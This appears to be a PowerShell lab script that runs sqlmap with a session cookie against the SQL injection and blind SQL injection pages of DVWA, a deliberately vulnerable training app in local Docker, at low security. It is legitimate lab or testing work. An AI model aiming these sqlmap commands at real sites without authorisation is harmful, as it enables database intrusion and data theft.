# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "dvwa"
$sqlmap_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.sqlmap))
$output_dir = Join-Path $PSScriptRoot $config.output_raw

$url_sqli = $config.environment.dvwa_docker + "/vulnerabilities/sqli/?id=1&Submit=Submit"
$url_blind = $config.environment.dvwa_docker + "/vulnerabilities/sqli_blind/?id=1&Submit=Submit"

$phpsessid = $config.targets.$target.phpsessid
$cookie_low = "security=low; PHPSESSID={0}" -f $phpsessid


# Low security sqli

python $sqlmap_path -u "$url_sqli" --cookie="$cookie_low" --batch --output-dir="$output_dir\dvwa_low"

# Low security sqli (blind)

python $sqlmap_path -u "$url_blind" --cookie="$cookie_low" --batch --output-dir="$output_dir\dvwa_low"